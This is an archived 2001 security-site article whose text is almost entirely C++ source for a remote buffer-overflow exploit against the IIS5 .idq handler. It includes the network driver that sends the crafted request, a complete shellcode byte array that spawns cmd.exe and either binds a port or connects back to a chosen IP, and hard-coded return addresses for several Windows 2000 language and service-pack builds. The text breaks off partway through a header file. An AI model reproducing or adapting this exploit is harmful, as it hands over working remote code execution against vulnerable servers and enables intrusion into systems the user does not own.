---
title: "IIS5_IDQ命令行溢出程序源代码"
date: 2001-07-31T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-242"
---

(inburst_at_263.net)

SNAKE的IIS5_IDQ命令行溢出程序源代码


by snake. 2001/7/31　


IIS5_IDQ溢出。。。从Internet上学习到的，也让他回归internet.


　


文件结构:


cpp文件:    iisidqoverflow.cpp 和 SkShellCodeFunc.cpp 

头文件:     SkShellCodeFunc.h 

功能文件:  WSAStart.cpp和SnakeSocket.cpp wsastart.h snakesocket.h（这4个文件不提供...因为，他们实现的只是WSAStart和socket的功能，你要成功编译本程序，必须自己替换相关的WSAStart和socket功能的代码.特此声明!) 

中间文件:  iis_idq.asm --用来实现shellcode数据的文件，编译的时候，不必编译，只是为了中间产生shellcode数据.它实现了溢出后，程序的处理:创建一个进程，并且绑定一个端口。这个还可以用于其他的windows溢出. 

　


文件1:iisidqoverflow.cpp (主文件)


#include <afxwin.h>

#include "snakesocket.h"

#include "wsastart.h"

#include "SkShellCodeFunc.h"


//function predeclare.

//取得 需要 地址 信息

void GetNecesProcAddr( char *szInfo, int iMaxSize);

//生成我的 shell code代码.

int Sk_Make_IIS5_IDQ_ShellCode(char *pszOutput, SYSTEM_TYPE SystemType, ConnectStruct *pConnectStruct, LPCTSTR lpszBindCmd);


//宣示帮助.

void ShowHelp()

{

  int i;


  printf("运行参数:  操作系统类型 目的地址 web端口 1 溢出监听端口 <输入命令1>\r\n");

  printf("    或者:  操作系统类型 目的地址 web端口 2 溢出连接IP 溢出连接端口 <输入命令1>\r\n");

  printf("\r\n\r\n  其中,如果输入命令参数没有输入,那么,默认为:\"cmd.exe /c + dir\"");

  printf("\r\n  如果为1,那么,将输入新的命令.");


  printf("\r\n\r\n支持的操作系统 类型: ----\r\n");

  

  for( i=0; i 0){

    send( msocket, szBuff, iLen, 0);

  }


  return (iLen>0)?true:false;

}


int main(int argc, char *argv[])

{

  CWSAStart wsaStart;

  CSnakeSocket snakeSocket;

  WORD wPort;

  DWORD dwIP;


  if( argc > 1){

    if( stricmp( argv[1], "GetAddr") == 0){

      char szTemp[12048];

      GetNecesProcAddr(szTemp, sizeof(szTemp) );


      printf("%s\r\n",szTemp);


      OSVERSIONINFO osInfo;

      

      osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

      GetVersionEx( &osInfo);

      printf("Version: %d - %d. Build:%d. ID:%d\r\n[%s]\r\n", 

        osInfo.dwMajorVersion, osInfo.dwMinorVersion,

        osInfo.dwBuildNumber, osInfo.dwPlatformId,

        osInfo.szCSDVersion);

      return 0;

    }

  }

  if( argc < 5){

    ShowHelp();

    return 0;

  }

  wsaStart.StartUP();


  SYSTEM_TYPE SystemType = (SYSTEM_TYPE)atoi(argv[1]);

  if( SystemType >= MAX_SYSTEM_TYPE_NUM){

    printf("操作系统类型 不正确.\r\n");

    ShowHelp();

    return 0;

  }

  dwIP = snakeSocket.GetHostAddr( argv[2]);

  if( dwIP == 0){

    printf("输入地址不对.\r\n");

    return 0;

  }


  Sk_ConnectType connectType;

  ConnectStruct connectStruct;

  char szCommand[129]="cmd.exe /c dir c:\\";

  BOOL bInputCommand=false;


  connectType = (Sk_ConnectType)atoi(argv[4]);

  connectStruct.byConnectType = connectType;

  switch(connectType){

  case LISTEN_ON_PORT:

    connectStruct.wListenPort = atoi(argv[5]);

    if( argc >= 7){

      bInputCommand = true;

    }

    break;

  case CONNECT_TO_HOST:

    if( argc < 6){

      printf("参数不足够.\r\n");

      return 0;

    }

    connectStruct.dwConnectIP = snakeSocket.GetHostAddr(argv[5]);

    connectStruct.wConnectPort = atoi(argv[6]);

    if( argc >= 8){

      bInputCommand = true;

    }

    break;

  default:

    printf("溢出类型不正确.\r\n");

    return 0;

  }


  if( bInputCommand){

    printf("\r\n请输入绑定的命令:");

    scanf( "%s",szCommand);

  }


  snakeSocket.CreateSocket();

  wPort = atoi(argv[3]);


  if( !snakeSocket.connect( argv[2], wPort)){

    printf("连接目的机器 %s:%d 失败.\r\n", argv[2], wPort);

    return 0;

  }

  else

    printf("连接目的机器 %s:%d OK.\r\n", argv[2], wPort);


  BOOL bValue = SendIDQExploit( snakeSocket.m_Socket, SystemType, &connectStruct, szCommand);


  if( bValue){

    printf( "发送shellcode 到 %s:%d OK\r\n", argv[2], wPort);

    printf(" 现在，如果系统类型正确,并且漏洞存在,那么,应该 可以得到 [%s] 结果了...,good luck.!", szCommand);

  }

  else{

    printf( "发送失败, 对方系统类型不支持\r\n");

  }


  snakeSocket.CloseSocket();

  wsaStart.CleanUP();


  return 0;

}


文件2. SkShellCodeFunc.cpp (发送shellcode的文件)


//SkShellCodeFunc.cpp

////////////////////////////////////////////////////////////////////////////////

// shellcode 函数

////////////////////////////////////////////////////////////////////////////////

// start by snake. 2001/7/11

////////////////////////////////////////////////////////////////////////////////


#include <windows.h>

#include "SkShellCodeFunc.h"


//搜索JUMP_EBX的地址

WORD Search_Jump_Ebx_Code(DWORD *dwArray, WORD wMaxCount);


static const char szSystemName[MAX_SYSTEM_TYPE_NUM+1][60]=

{

  "IIS5中文Win2k Sp0",

  "IIS5中文Win2k Sp1",

  "IIS5中文Win2k Sp2",


  "IIS5 English Win2k Sp0",

  "IIS5 English Win2k Sp1",

  "--IIS5 English Win2k Sp2",


  "IIS5 Japanese Win2k Sp0",

  "IIS5 Japanese Win2k Sp1",

  "--IIS5 Japanese Win2k Sp2",


  "IIS5 Mexico Win2k",

  "--IIS5 Mexico Win2k sp1",

  "--IIS5 Mexico Win2k sp2",


  "Unknown..",

};


//取得一个系统的名字.

LPCTSTR GetSystemName( SYSTEM_TYPE type)

{

  if( type > MAX_SYSTEM_TYPE_NUM) type = MAX_SYSTEM_TYPE_NUM;

  return szSystemName[type];

}


typedef struct _Call_Func_Addr{

  DWORD dwGetModuleHandle;

  DWORD dwGetProcAddress;

  DWORD dwRetJmpEbxAddr;

}Call_Func_Addr;


//2个函数的地址(不通的系统有不通的地址)

static const Call_Func_Addr AllSystemFuncAddr[MAX_SYSTEM_TYPE_NUM]=

{

  { 0x77e756db, 0x77e7564b, 0x77e4ac97}, //IIS5_WIN2K_CHINESE_SP0

  { 0x77e6380e, 0x77e67031, 0x77E4BF17}, //IIS5_WIN2K_CHINESE_SP1

  { 0x77e66c42, 0x77e69ac1, 0x77e4ac97}, //IIS5_WIN2K_CHINESE_SP2


  { 0x77E956DB, 0x77E9564B, 0x77E6F533}, //IIS5_WIN2K_ENGLISH_SP0

  { 0x77E8380E, 0x77E87031, 0x77E6E52B}, //IIS5_WIN2K_ENGLISH_SP1

  { 0, 0}, //IIS5_WIN2K_ENGLISH_SP2


  { 0x77E656DB, 0x77E6564B, 0x77E3AF17}, //IIS5_WIN2K_JAPANESE_SP0,

  { 0x77E5380E, 0x77E57031, 0x77E3BCAF}, //IIS5_WIN2K_JAPANESE_SP1,

  { 0, 0}, //IIS5_WIN2K_JAPANESE_SP2,


  { 0x77E956DB, 0x77E9564B, 0x77E596D2 },//IIS_WIN2K_MEXICO_SP0,

  { 0, 0, 0 },//IIS_WIN2K_MEXICO_SP0,

  { 0, 0, 0 },//IIS_WIN2K_MEXICO_SP0,

};


//下面的#define 代码 的分析，是从isno的文章里面copy到的，thanks isno.

#define IIS5_IDQ_EXCEPTION_OFFSET 234 /* exception handler offset */ 

static unsigned char forwardjump[]= "%u08eb"; 

/*这是覆盖异常结构的jmp 08h，用来跳到后面寻址shellcode的那段代码*/ 


static unsigned char jump_to_shell[]= 

"%uC033%uB866%u031F%u0340%u8BD8%u8B03" 

"%u6840%uDB33%u30B3%uC303%uE0FF"; 

/* 

  跳转到shellcode去，我不一句句的解释了，如果有兴趣可以自己看， 

  注意每两个字节都是反的，%uC033在转换后变成了\x33\xC0。 

*/ 


//下面的数据,可以绑定shell到一个端口,并且监听.

char szSnakeBindShellCode[]=

"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

"\x90\x90\x90\x90\x90\x90\x90\x90\x90"

"\x55\x8B\xEC\x33\xC0\x40\xC1\xE0\x0B\x2B\xE0\xEB\x03\x90\xEB\x4E\xE8\xF9\xFF\xFF\xFF\x55\x8B\xEC\x57\x51\x50\x52\x8B\x7D\x08\x8B\x4D\x0C\x8B\x45\x10\x8B\x55\x14\xF2\xAE\x67\xE3\x06\x4F\x88\x17\x41\xEB\xF5\x5A\x58\x59\x5F\x5D\xC3\x53\x51\x52\x33\xD2\x50\x5B\xC1\xEB\x10\x50\x59\x80\xFF\x01\x74\x02\xFE\xCB\x8A\xC3"

"\x85\xD2\x75\x08\xC1\xE0\x08\x51\x5B\x42\xEB\xEB\x5A\x59\x5B\xC3\xEB\x4F\x55\x8B\xEC\x56\x57\x52\x51\x53\x50\x8B\x7D\x08\x8B\x75\x0C\x33\xDB\x33\xC9\xB1\x80\x03\xF1\x8A\x0E\x46\x51\x8A\x1E\x46\x56\x8B\x45\x10\xFF\xD0\x03\xF3\x33\xC9\x8A\x0E\x46\x51\x8A\x1E\x46\x50\x56\x56\x50\x8B\x4D\x14\xFF\xD1\x89\x07\x83\xC7"

"\x04\x5E\x58\x03\xF3\x59\xE2\xE7\x59\xE2\xD3\x58\x5B\x59\x5A\x5F\x5E\x5D\xC3\xEB\x7C\x55\x8B\xEC\x33\xC0\x66\xB8\xF0\x03\x2B\xE0\x56\x57\x52\x51\x53\x8B\x75\x08\x8D\xBD\xC0\xFC\xFF\xFF\x33\xC0\xB0\x02\x57\x50\x8B\x46\x54\xFF\xD0\x33\xC0\x50\x40\x50\x40\x50\x8B\x46\x38\xFF\xD0\x8B\x55\x0C\x8D\x1A\x8A\x0B\x50\x8D"

"\xBD\x10\xFF\xFF\xFF\x8D\x1F\x33\xC0\xB0\x02\x66\x89\x03\x58\x80\xF9\x01\x75\x69\x50\x50\x8B\x42\x04\xE8\x31\xFF\xFF\xFF\x8B\xC8\x86\xE9\x58\x8D\x5F\x02\x8B\x55\x0C\x66\x89\x0B\x33\xC0\x8D\x5F\x04\x89\x03\x58\x50\x33\xC9\xB1\x10\x51\x57\x50\x8B\x46\x3C\xFF\xD0\xEB\x02\xEB\x4D\x58\x50\x33\xC9\x41\x51\x50\x8B\x46"

"\x40\xFF\xD0\x58\x50\x33\xC9\xB1\x10\x8D\xBD\x40\xFF\xFF\xFF\x89\x0F\x57\x8D\xBD\x10\xFF\xFF\xFF\x57\x50\x8B\x46\x44\xFF\xD0\x5A\x50\x52\x8B\x46\x58\xFF\xD0\x58\x83\xF8\xFF\x74\x7A\xEB\x53\x50\x8B\x42\x10\xE8\xC9\xFE\xFF\xFF\x8B\xC8\x86\xE9\x8D\x5F\x02\x66\x89\x0B\xEB\x02\xEB\x6A\x8B\x42\x08\xE8\xB3\xFE\xFF\xFF"

"\x8B\xC8\xC1\xE1\x10\x8B\x42\x0C\xE8\xA6\xFE\xFF\xFF\x66\x8B\xC8\x8D\x5F\x04\x89\x0B\x58\x50\x33\xC9\xB1\x10\x51\x57\x50\x8B\x46\x5C\xFF\xD0\x8B\xC8\x58\x67\xE3\x0B\x90\x50\x8B\x46\x58\xFF\xD0\x33\xC0\xEB\x25\x50\x50\x5A\x8D\xBD\x10\xFF\xFF\xFF\x33\xC0\xB0\x01\x89\x07\xC1\xE0\x02\x50\x57\x66\xB8\x06\x10\x50\x66"

"\xB8\xFF\xFF\x50\x52\x8B\x46\x50\xFF\xD0\x58\x5B\x59\x5A\x5F\x5E\x8B\xE5\x5D\xC3\xEB\x62\x55\x8B\xEC\x57\x56\x52\x51\x53\x50\x8B\x7D\x0C\x57\x5A\x33\xC0\x8D\x7F\x24\x57\x33\xC9\xB1\x44\xF3\xAA\x5F\x8D\x37\xB1\x44\x89\x0E\x8D\x77\x2C\x66\xB9\x01\x01\x89\x0E\x57\x8D\x7F\x38\x8D\x72\x0C\x8B\x06\x89\x07\x5F\x57\x8D"

"\x7F\x3C\x8D\x72\x04\x8B\x06\x89\x07\x5F\x8B\x75\x08\x8B\x46\x30\xFF\xD0\x33\xC9\x51\x41\x51\x41\x51\x8D\x57\x40\x52\x50\x56\x8B\x75\x0C\x8D\x76\x04\x8B\x1E\x5E\xEB\x02\xEB\x42\x53\x50\x8B\x46\x2C\xFF\xD0\x33\xC0\x8B\x7D\x0C\x8D\x57\x14\x52\x8D\x57\x24\x52\x50\x50\x50\x40\x50\x48\x50\x50\x8B\x55\x10\x52\x50\x8B"

"\x46\x0C\xFF\xD0\x8B\x47\x0C\x50\x8B\x46\x34\xFF\xD0\x8B\x47\x04\x50\x8B\x46\x34\xFF\xD0\x58\x5B\x59\x5A\x5E\x5F\x8B\xE5\x5D\xC3\xEB\x33\x55\x8B\xEC\x56\x57\x52\x51\x53\x50\x8B\x75\x08\x8B\x7D\x0C\x8B\x47\x10\x50\x8B\x46\x58\xFF\xD0\x8B\x07\x50\x8B\x46\x34\xFF\xD0\x8B\x47\x08\x50\x8B\x46\x34\xFF\xD0\x58\x5B\x59"

"\x5A\x5F\x5E\x8B\xE5\x5D\xC3\xEB\x77\x55\x8B\xEC\x33\xC0\x66\xB8\xF0\x02\x2B\xE0\x56\x57\x52\x51\x53\x8B\x75\x08\x8B\x7D\x0C\x8D\x55\xF8\x33\xC0\x40\x89\x02\x8D\x55\xF8\x8B\x02\x85\xC0\x74\x2A\x33\xC0\x50\xB0\xF0\x50\x8D\x85\x08\xFF\xFF\xFF\x50\x8D\x5F\x10\x8B\x03\x50\x8B\x46\x4C\xFF\xD0\x83\xF8\xFF\x75\x0F\x50"

"\x5A\x8B\x46\x28\xFF\xD0\x66\x3D\x4C\x27\x74\x28\xEB\x7F\x85\xC0\x74\x7B\x7E\x20\x33\xD2\x52\x8D\x5D\xFC\x53\x50\x8D\x9D\x08\xFF\xFF\xFF\x53\x8B\x47\x08\x50\x8B\x46\x18\xFF\xD0\x85\xC0\x74\x5D\xEB\x02\xEB\x62\x33\xC0\x50\x8D\x55\xFC\x52\x50\x50\x50\x8B\x07\x50\x8B\x46\x10\xFF\xD0\x8B\x45\xFC\x85\xC0\x74\x3B\x33"

"\xC0\x50\x8D\x55\xFC\x52\xB0\xF0\x50\x8D\x95\x08\xFF\xFF\xFF\x52\x8B\x07\x50\x8B\x46\x1C\xFF\xD0\x85\xC0\x74\x23\x33\xC0\x50\x8B\x45\xFC\x50\x8D\x95\x08\xFF\xFF\xFF\x52\x8B\x47\x10\x50\x8B\x46\x48\xFF\xD0\x83\xF8\xFF\x74\x07\xEB\xAC\xE9\x4C\xFF\xFF\xFF\x5B\x59\x5A\x5F\x5E\x8B\xE5\x5D\xC3\xEB\x72\x55\x8B\xEC\x33"

"\xC0\xB0\xF0\x2B\xE0\x56\x57\x52\x51\x53\x8B\x75\x08\x8B\x7D\x0C\x33\xDB\x8D\x7D\xF0\x8D\x57\x04\x89\x1A\x8D\x57\x08\x43\x89\x1A\x8D\x17\xB3\x0C\x89\x1A\x33\xDB\x57\x53\x57\x8B\x7D\x0C\x8D\x57\x04\x89\x1A\x52\x8D\x17\x52\x8B\x46\x04\xFF\xD0\x5F\x85\xC0\x74\x1F\x33\xDB\x53\x57\x8B\x7D\x0C\x8D\x57\x08\x52\x8D\x57"

"\x0C\x89\x1A\x52\x8B\x46\x04\xFF\xD0\x85\xC0\x74\x05\x33\xC0\x40\xEB\x05\x33\xC0\xEB\x01\x90\x5B\x59\x5A\x5F\x5E\x8B\xE5\x5D\xC3\x8D\x34\x24\x8B\x36\x33\xC9\x66\xB9\xCC\x04\x03\xF1\x8D\xBD\x30\xFE\xFF\xFF\x57\x66\xB9\xFA\x01\xF3\xA4\x5F\x57\x33\xC9\x51\xB1\x2B\x51\x66\xB9\xE6\x01\x51\x33\xDB\xB3\x14\x03\xFB\x57"

"\xE8\xCC\xFB\xFF\xFF\x83\xC4\x10\x33\xC9\x66\xB9\xDD\x01\x8B\xF7\x03\xF1\x8B\x46\x04\x50\x8B\x06\x50\x57\x8D\xB5\x30\xFD\xFF\xFF\x56\xE8\xF6\xFB\xFF\xFF\x83\xC4\x10\x5F\x57\x56\xE8\x3C\xFC\xFF\xFF\x83\xC4\x08\x85\xC0\x74\x57\x8D\xBD\x10\xFC\xFF\xFF\x8D\x5F\x10\x89\x03\x57\x56\xE8\x16\xFF\xFF\xFF\x83\xC4\x08\x85"

"\xC0\x74\x3E\x8D\xBD\x30\xFE\xFF\xFF\x33\xC0\xB0\x14\x03\xF8\x57\x8D\xBD\x10\xFC\xFF\xFF\x57\x56\xE8\x3B\xFD\xFF\xFF\x83\xC4\x0C\x57\x56\xE8\x0E\xFE\xFF\xFF\x83\xC4\x08\x57\x56\xE8\xCF\xFD\xFF\xFF\x83\xC4\x08\x33\xC0\x50\x8D\x57\x14\x8B\x02\x50\x8B\x06\xFF\xD0\x33\xC0\x50\x8B\x46\x24\xFF\xD0\xC3\x8B\xE5\x5D\x90"

"\x90\x02\xFF\xFF\xFF\x51\x01\x01\x02\x01\x02\x25\x01\xC0\x01\xA8\x01\x58\x01\x01\x02\x63\x6D\x64\x2E\x65\x78\x65\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B"

"\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x02\x0E\x6B\x65\x72\x6E\x65"

"\x6C\x33\x32\x2E\x64\x6C\x6C\x2B\x2B\x0E\x11\x54\x65\x72\x6D\x69\x6E\x61\x74\x65\x50\x72\x6F\x63\x65\x73\x73\x2B\x0B\x43\x72\x65\x61\x74\x65\x50\x69\x70\x65\x2B\x10\x47\x65\x74\x53\x74\x61\x72\x74\x75\x70\x49\x6E\x66\x6F\x41\x2B\x0F\x43\x72\x65\x61\x74\x65\x50\x72\x6F\x63\x65\x73\x73\x41\x2B\x0E\x50\x65\x65\x6B"

"\x4E\x61\x6D\x65\x64\x50\x69\x70\x65\x2B\x0C\x47\x6C\x6F\x62\x61\x6C\x41\x6C\x6C\x6F\x63\x2B\x0B\x57\x72\x69\x74\x65\x46\x69\x6C\x65\x2B\x2B\x09\x52\x65\x61\x64\x46\x69\x6C\x65\x2B\x06\x53\x6C\x65\x65\x70\x2B\x0C\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73\x2B\x0E\x47\x65\x74\x4C\x61\x73\x74\x45\x72\x72\x6F\x72"

"\x2B\x2B\x10\x44\x75\x70\x6C\x69\x63\x61\x74\x65\x48\x61\x6E\x64\x6C\x65\x2B\x12\x47\x65\x74\x43\x75\x72\x72\x65\x6E\x74\x50\x72\x6F\x63\x65\x73\x73\x2B\x0C\x43\x6C\x6F\x73\x65\x48\x61\x6E\x64\x6C\x65\x2B\x0B\x77\x73\x32\x5F\x33\x32\x2E\x64\x6C\x6C\x2B\x0B\x07\x73\x6F\x63\x6B\x65\x74\x2B\x05\x62\x69\x6E\x64\x2B"

"\x07\x6C\x69\x73\x74\x65\x6E\x2B\x07\x61\x63\x63\x65\x70\x74\x2B\x05\x73\x65\x6E\x64\x2B\x05\x72\x65\x63\x76\x2B\x0B\x73\x65\x74\x73\x6F\x63\x6B\x6F\x70\x74\x2B\x0B\x57\x53\x41\x53\x74\x61\x72\x74\x75\x70\x2B\x0C\x63\x6C\x6F\x73\x65\x73\x6F\x63\x6B\x65\x74\x2B\x08\x63\x6F\x6E\x6E\x65\x63\x74\x2B\x0C\x67\x65\x74"

"\x68\x6F\x73\x74\x6E\x61\x6D\x65\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\x2B\xDB\x56\xE7\x77\x4B\x56\xE7\x77\x00";


//我的私有信息:

static const char szSnakeSign[]="snake_program_code_v2.0";


#define PREHEAD_NOP_SIZE 0x24


#define dwConnectType_Offset 1249+PREHEAD_NOP_SIZE

#define dwListenPort_Offset 1253+PREHEAD_NOP_SIZE

#define dwConnectIP1_Offset 1257+PREHEAD_NOP_SIZE

#define dwConnectIP2_Offset 1261+PREHEAD_NOP_SIZE

#define dwConnectPort_Offset 1265+PREHEAD_NOP_SIZE

#define dwExecCommand_Offset 1269+PREHEAD_NOP_SIZE

#define wExecCommandSize 128

#define dwGetModuleHandle_Offset 1746+PREHEAD_NOP_SIZE

#define dwGetProcAddress_Offset 1750+PREHEAD_NOP_SIZE


BYTE byReservedValue[]={ 0, 0x0a, 0x0d};


;//转换标准word -> snake ShellCode Reserve Value.

;//该 byte == 0, 0x0a, 0x0d,那么，高位为2. 低位 +1.

;//                               高位 为1,低位不变.

DWORD Convert_Ansi_Word_To_Sk_Long(WORD wValue)

{

  int iReservCount, i;

  WORD wTemp;

  DWORD dwRetValue = 0;

  BOOL bFirst=true;


  iReservCount = sizeof(byReservedValue)/sizeof(BYTE);


  while(1){

    wTemp = wValue&0xff00;

    wTemp >>= 8;

    for( i=0; i<iReservCount; i++){

      if( wTemp == byReservedValue[i]) break;

    }

    if( i == iReservCount)

      wTemp |= 0x0100;

    else{

      wTemp++;

      wTemp |= 0x0200;

    }

    dwRetValue |= wTemp;

    

    if( bFirst){

      bFirst = false;

      dwRetValue <<= 16;

      wValue <<=8;

    }

    else

      break;

  }

  return dwRetValue;

}


typedef void (*SkRunPointer)();


//生成我的 IIS5 idq shell code代码.

int Sk_Make_IIS5_IDQ_ShellCode(char *pszOutput, SYSTEM_TYPE SystemType, ConnectStruct *pConnectStruct, LPCTSTR lpszBindCmd)

{

  char szBuf[2048];

  char szOutput[10000], szCreateCode[10000];

  char *p;


  DWORD dwGetModuleHandle = 0, dwGetProcAddress=0, dwRetJmpEbx=0;

  WORD wSelectValue = MAX_SYSTEM_TYPE_NUM;


  switch( SystemType){

  case IIS5_WIN2K_CHINESE_SP0:

    wSelectValue = IIS5_WIN2K_CHINESE_SP0;

    break;

  case IIS5_WIN2K_CHINESE_SP1:

    wSelectValue = IIS5_WIN2K_CHINESE_SP1;

    break;

  case IIS5_WIN2K_CHINESE_SP2:

    wSelectValue = IIS5_WIN2K_CHINESE_SP2;

    break;


  case IIS5_WIN2K_ENGLISH_SP0:

    wSelectValue = IIS5_WIN2K_ENGLISH_SP0;

    break;

  case IIS5_WIN2K_ENGLISH_SP1:

    wSelectValue = IIS5_WIN2K_ENGLISH_SP1;

    break;

  case IIS5_WIN2K_ENGLISH_SP2:

    break;


  case IIS5_WIN2K_JAPANESE_SP0:

    wSelectValue = IIS5_WIN2K_JAPANESE_SP0;

    break;

  case IIS5_WIN2K_JAPANESE_SP1:

    wSelectValue = IIS5_WIN2K_JAPANESE_SP1;

    break;

  case IIS5_WIN2K_JAPANESE_SP2:

    wSelectValue = IIS5_WIN2K_JAPANESE_SP2;

    break;


  case IIS_WIN2K_MEXICO_SP0:

    wSelectValue = IIS_WIN2K_MEXICO_SP0;

    break;

  case IIS_WIN2K_MEXICO_SP1:

    wSelectValue = IIS_WIN2K_MEXICO_SP1;

    break;

  case IIS_WIN2K_MEXICO_SP2:

    wSelectValue = IIS_WIN2K_MEXICO_SP2;

    break;

  default:

    break;

  }


  if( wSelectValue >= MAX_SYSTEM_TYPE_NUM) return 0;


  dwGetModuleHandle = AllSystemFuncAddr[wSelectValue].dwGetModuleHandle;

  dwGetProcAddress = AllSystemFuncAddr[wSelectValue].dwGetProcAddress;

  dwRetJmpEbx = AllSystemFuncAddr[wSelectValue].dwRetJmpEbxAddr;


  if( dwGetModuleHandle == 0) return 0;


  memset( szBuf, 1, sizeof(szBuf));

  memcpy( szBuf, szSnakeSign, strlen(szSnakeSign));

  p = &(szBuf[IIS5_IDQ_EXCEPTION_OFFSET-2]);


  wsprintf( p,"%s", forwardjump);

  p += strlen((char *)forwardjump);

  *p++ = 1;

  *p++ = '%';

  *p++ = 'u';

  wsprintf( p, "%04x", (dwRetJmpEbx>>0)&0xffff);

  p += 4;

  *p ++ = '%';

  *p ++ = 'u';

  wsprintf( p, "%04x", (dwRetJmpEbx>>16)&0xffff);

  p += 4;

  *p++ = 1;

  wsprintf( p, "%s", jump_to_shell);


  //wsprintf( szOutput,"GET /n.idq?%s=b HTTP/1.0\r\nShell: %s\r\n\r\n", szBuf, szMyCode);

  wsprintf( szOutput,"GET /n.idq?%s=b HTTP/1.0\r\nSnake: ", szBuf);


  memcpy( szCreateCode, szSnakeBindShellCode, sizeof(szSnakeBindShellCode));


  //将地址信息, 端口信息 写入 shellcode代码.

  DWORD *pdw, dwTemp;

  WORD wTemp;

  char *lpsz, szExecTemp[wExecCommandSize];


  //Init Value.

  switch( pConnectStruct->byConnectType){

  case LISTEN_ON_PORT:

    szCreateCode[dwConnectType_Offset] = LISTEN_ON_PORT;

    dwTemp = Convert_Ansi_Word_To_Sk_Long( pConnectStruct->wListenPort);

    lpsz = &( szCreateCode[dwListenPort_Offset]);

    pdw = (DWORD *)lpsz;

    *pdw = dwTemp; //set listen port.

    break;

  case CONNECT_TO_HOST:

    szCreateCode[dwConnectType_Offset] = CONNECT_TO_HOST;

    

    wTemp = (WORD)( (pConnectStruct->dwConnectIP) & 0xffff);

    dwTemp = Convert_Ansi_Word_To_Sk_Long( wTemp);

    lpsz = &( szCreateCode[dwConnectIP2_Offset]);

    pdw = (DWORD *)lpsz;

    *pdw = dwTemp; //set IP1.


    wTemp = (WORD)( ((pConnectStruct->dwConnectIP) & 0xffff0000) >> 16);

    dwTemp = Convert_Ansi_Word_To_Sk_Long( wTemp);

    lpsz = &( szCreateCode[dwConnectIP1_Offset]);

    pdw = (DWORD *)lpsz;

    *pdw = dwTemp; //set IP2.


    dwTemp = Convert_Ansi_Word_To_Sk_Long( pConnectStruct->wConnectPort);

    lpsz = &( szCreateCode[dwConnectPort_Offset]);

    pdw = (DWORD *)lpsz;

    *pdw = dwTemp; //set connect Port.

    break;

  default:

    return 0;

  }


  lpsz = &( szCreateCode[dwGetModuleHandle_Offset]);

  pdw = (DWORD *)lpsz;

  *pdw = dwGetModuleHandle; //set dwGetModuleHandle.


  lpsz = &( szCreateCode[dwGetProcAddress_Offset]);

  pdw = (DWORD *)lpsz;

  *pdw = dwGetProcAddress; //set dwGetProcAddress.


  memset( szExecTemp, '+', wExecCommandSize);

  wTemp = strlen( lpszBindCmd);

  if(wTemp >= wExecCommandSize)

    wTemp = wExecCommandSize-1;

  strncpy( szExecTemp, lpszBindCmd, wTemp);


  lpsz = &( szCreateCode[dwExecCommand_Offset]);

  memcpy( lpsz, szExecTemp, wExecCommandSize);


  strcat( szOutput, szCreateCode);

  strcat( szOutput, "\r\n\r\n");


  strcpy( pszOutput, szOutput);


  return strlen( pszOutput);

}


//取得 需要 地址 信息

void GetNecesProcAddr( char *szInfo, int iMaxSize)

{

  HANDLE hModule = GetModuleHandle("kernel32");

  DWORD dwAddr_GetHandle, dwAddr_GetProcAddr;

  char szOutput[11024], szJmpAddr[8124], szOne[20];

  DWORD dwJmpEbx[100];

  WORD wGetJmpCount,w;


  wGetJmpCount = Search_Jump_Ebx_Code(dwJmpEbx, 100);

  szJmpAddr[0] = 0;

  for( w=0; w<wGetJmpCount; w++){

    wsprintf( szOne," 0x%X", dwJmpEbx[w]);

    strcat( szJmpAddr, szOne);

  }


  dwAddr_GetHandle = (DWORD)GetProcAddress( (HINSTANCE)hModule,"GetModuleHandleA");

  dwAddr_GetProcAddr = (DWORD)GetProcAddress( (HINSTANCE)hModule, "GetProcAddress");

  wsprintf( szOutput,"Addr1: 0x%X; Addr2: 0x%X\r\nJJ:%s",

    dwAddr_GetHandle, dwAddr_GetProcAddr, szJmpAddr);

  //MessageBox( NULL, szOutput, "topic", MB_OK);

  strncpy( szInfo, szOutput, iMaxSize);

  szInfo[iMaxSize-1] = 0;

}


#define JUMP_EBX_CODE 0xe3ff


//搜索JUMP_EBX的地址

WORD Search_Jump_Ebx_Code(DWORD *dwArray, WORD wMaxCount)

{

  HANDLE hDllModule = GetModuleHandle("user32");

  

  char *pValue;

  WORD wTemp = JUMP_EBX_CODE;

  DWORD dwMin = (DWORD)hDllModule,dwMax;

  WORD wCount = 0;


  pValue = (char*)dwMin;

  wCount = 0;


  dwMax = dwMin + 400000; //size is 39kb.

  while( ( (DWORD)pValue) < dwMax){

    if( *((WORD *)pValue) == JUMP_EBX_CODE){

      dwArray[wCount++] = (DWORD)pValue;

      if( wCount >= wMaxCount) break;

    }

    pValue++;

  }

  return wCount;

}


文件3. SkShellCodeFunc.h -- 必须的头文件 

//SkShellCodeFunc.h

////////////////////////////////////////////////////////////////////////////////

// header file for 定义shellcode 函数

////////////////////////////////////////////////////////////////////////////////

// start by snake. 2001/7/11

////////////////////////////////////////////////////////////////////////////////


#ifndef _SNAKE_SHELLCODE_FUNC_HEADER_2001_7_11

#define _SNAKE_SHELLCODE_FUNC_HEADER_2001_7_11


enum SYSTEM_TYPE{

  IIS5_WIN2K_CHINESE_SP0,

  IIS5_WIN2K_CHINESE_SP1,

  IIS5_WIN2K_CHINESE_SP2,


